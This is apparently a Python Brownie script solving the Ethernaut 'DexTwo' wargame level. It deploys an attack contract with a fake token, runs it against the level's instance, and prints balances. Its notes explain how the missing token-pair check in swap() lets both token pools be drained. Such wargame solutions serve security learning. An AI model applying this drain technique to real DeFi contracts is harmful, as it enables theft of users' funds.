from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, DexTwo, Attack23
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0xF9467C174F53FfD854c572AA1B87819c35620825"

TOKEN1 = "0x8920D9c3e74bD47E8A65b571C6a93f224E70b7b6"
TOKEN2 = "0x6923A6dcBEf9c47B97C20eBbE33277D6fBE072Ae"

GAS_LIMIT = 12000000


def main():
    player = get_account()
    target = interface.IDexTwo(ETHERNAUT_INSTANCE)
    attack = Attack23.deploy(
        ETHERNAUT_INSTANCE, "AttackCoin", "ATK", 4, {"from": player}
    )
    print_balances(target)
    attack.attack({"from": player})
    print_balances(target)


def print_balances(_target):
    token1_balance = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    token2_balance = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nBalance of token1 = {token1_balance}")
    print(f"Balance of token2 = {token2_balance}\n")


""" 
        Audit notes

    1. we need to drain token1 AND token2 this time!!    

    2. function swap() has been modified, from Dex (one)
        
    2a. the following require statement has been removed:

        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

    3. player balances of each token = 10

    4. DexTwo balances of each token = 100 

    
        Attack philosophy:

    1. deploy an attack contract to act as a 3rd token pool ??

    2. swap calculation in level-23 spreadsheet
    
"""
